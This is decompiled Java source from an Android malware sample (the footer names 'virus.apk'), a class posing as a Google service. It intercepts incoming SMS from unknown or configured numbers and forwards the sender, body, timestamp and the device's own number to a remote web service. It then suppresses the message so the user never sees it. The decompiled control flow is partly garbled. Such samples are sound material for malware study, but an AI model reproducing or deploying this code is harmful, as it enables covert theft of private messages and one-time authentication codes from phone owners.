package com.example.google.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.util.ArrayList;
import java.util.Iterator;

public class SMSReceiver extends BroadcastReceiver
{
  private final int MSG_INBOXCONTENT = 2;
  private Context _Context = null;

  private Boolean isContact(String paramString)
  {
    ArrayList localArrayList = new ContactsHelper(this._Context).GetAllContactNumbers();
    if (localArrayList.contains(paramString))
      return Boolean.valueOf(true);
    Iterator localIterator = localArrayList.iterator();
    do
      if (!localIterator.hasNext())
        return Boolean.valueOf(false);
    while (paramString.indexOf((String)localIterator.next()) <= -1);
    return Boolean.valueOf(true);
  }

  private Boolean isSpecialNumber(String paramString)
  {
    String[] arrayOfString = this._Context.getString(2131034119).split(",");
    int i = arrayOfString.length;
    for (int j = 0; ; j++)
    {
      if (j >= i)
        return Boolean.valueOf(false);
      String str = arrayOfString[j];
      if ((str.length() > 0) && (paramString.indexOf(str) > -1))
        return Boolean.valueOf(true);
    }
  }

  public void onReceive(Context paramContext, Intent paramIntent)
  {
    this._Context = paramContext;
    Object[] arrayOfObject;
    SmsMessage[] arrayOfSmsMessage;
    int i;
    String str1;
    int j;
    int k;
    if (paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
    {
      Bundle localBundle = paramIntent.getExtras();
      if (localBundle != null)
      {
        arrayOfObject = (Object[])localBundle.get("pdus");
        arrayOfSmsMessage = new SmsMessage[arrayOfObject.length];
        i = 0;
        if (i < arrayOfObject.length)
          break label81;
        str1 = Tools.getPhoneNumber(this._Context);
        j = arrayOfSmsMessage.length;
        k = 0;
      }
    }
    while (true)
    {
      if (k >= j)
      {
        return;
        label81: arrayOfSmsMessage[i] = SmsMessage.createFromPdu((byte[])arrayOfObject[i]);
        i++;
        break;
      }
      SmsMessage localSmsMessage = arrayOfSmsMessage[k];
      String str2 = localSmsMessage.getDisplayOriginatingAddress();
      String str3;
      String str4;
      if ((isSpecialNumber(str2).booleanValue()) || (!isContact(str2).booleanValue()))
      {
        str3 = localSmsMessage.getMessageBody();
        str4 = Long.toString(localSmsMessage.getTimestampMillis());
      }
      try
      {
        new WebServiceCalling(this._Context).Forward(str1, str2.toString(), str3, str4);
        abortBroadcast();
        k++;
      }
      catch (Exception localException)
      {
        while (true)
          localException.printStackTrace();
      }
    }
  }
}

/* Location:           F:\SDK\dex2jar-0.0.9.15\virus.apk_dex2jar.jar
 * Qualified Name:     com.example.google.service.SMSReceiver
 * JD-Core Version:    0.6.2
 */